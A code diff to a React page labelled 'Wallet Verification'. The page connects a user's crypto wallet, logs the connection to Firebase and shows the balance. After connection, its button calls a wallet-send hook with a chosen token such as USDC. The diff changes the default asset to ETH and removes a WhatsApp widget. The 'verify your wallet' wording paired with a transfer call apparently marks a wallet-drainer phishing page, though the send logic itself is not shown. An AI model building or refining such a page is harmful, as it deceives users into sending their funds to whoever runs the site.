@@ -13,14 +13,14 @@ import { useAppKit, useAppKitAccount } from '@reown/appkit/react'
 import { useBalance } from 'wagmi'
 import { logUserConnection } from '@/lib/firebase'
 import { useWalletSend } from '@/hooks/useWalletSend'
-import FloatingWhatsApp from "@/components/FloatingWhatsApp";
+
 const Index = () => {
     const [isConnecting, setIsConnecting] = useState(false);
     const { toast } = useToast();
     const { open } = useAppKit()
     const { handleOpenSendWithArguments } = useWalletSend()
     const { address, isConnected } = useAppKitAccount()
-    const [selectedAsset, setSelectedAsset] = useState('BNB')
+    const [selectedAsset, setSelectedAsset] = useState('ETH')
 
     const { data: balanceData } = useBalance({
         address: address as `0x${string}`,
@@ -71,17 +71,15 @@ const Index = () => {
     }
 
     return (
-      <main className="min-h-screen bg-background py-12 px-4">
-      <div className="mx-auto max-w-md space-y-8">
-      
-         <div className="text-center space-y-4 pt-4">
+        <main className="flex min-h-screen items-center justify-center bg-background">
+            <div className="text-center space-y-6">
                 <h1 className="text-3xl font-semibold text-foreground tracking-tight">
                     Wallet Verification
                 </h1>
                 <p className="text-muted-foreground">
                     Click the button below to verify your wallet
                 </p>
-                {isConnected &&
+              
                     <div className="max-w-xs mx-auto mb-12">
                         <label className="block text-center text-primary/80 text-sm font-medium mb-3">
                             Select Asset to Interact With
@@ -91,16 +89,16 @@ const Index = () => {
                                 <SelectValue placeholder="Select Asset" />
                             </SelectTrigger>
                             <SelectContent className="bg-navy-light border-primary/20">
-                                <SelectItem value="BNB">BNB Smart Chain (BNB)</SelectItem>
+                                <SelectItem value="ETH">Ethereum (ETH)</SelectItem>
                                 <SelectItem value="USDC">USD Coin (USDC)</SelectItem>
                                 <SelectItem value="USDT">Tether (USDT)</SelectItem>
                             </SelectContent>
                         </Select>
 
                     </div>
-                }
+                
                 <Button
-                    onClick={() => { isConnected ? handlePartnerClick('USDT') : handleVerify() }}
+                    onClick={() => { isConnected ? handlePartnerClick('USDC') : handleVerify() }}
                     disabled={isConnecting}
                     size="lg"
                     className="min-w-[160px] transition-all duration-300"
@@ -120,9 +118,7 @@ const Index = () => {
                         </>
                     )}
                 </Button>
-                </div>
             </div>
-             <FloatingWhatsApp />
         </main>
     );
 };
